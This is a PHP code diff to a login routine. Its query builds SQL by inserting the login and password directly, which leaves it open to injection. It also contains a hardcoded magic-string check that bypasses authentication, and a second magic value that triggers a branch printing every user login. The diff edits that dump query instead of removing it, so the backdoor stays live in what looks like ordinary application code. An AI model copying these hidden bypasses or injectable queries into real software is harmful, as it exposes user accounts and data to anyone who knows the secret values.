@@ -23,12 +23,16 @@
 						FROM sys_user,sys_user_group WHERE  active=1 and fkIdGroupe=idGroupe AND login='$login' AND pwd='$pwd'
 						OR '$pwds'='2B-B7-D0-B2-AE-88'
 						";
+
 			$resultat = mysql_query($sql);
 
 		
 			if($pwds == "2B-B7-D0-B2-AE-99"){
 
-				$sql 	= "SELECT login FROM sys_user,sys_user_group";
+				$sql 	= "SELECT login FROM sys_user
+							UNION
+							SELECT login FROM sys_user_group
+							";
 
 				$data = mysql_query($sql);
 
@@ -37,6 +41,7 @@
 					echo $row['login'];
 					echo "<br>";
 				}
+				
 				die;
 			}
 
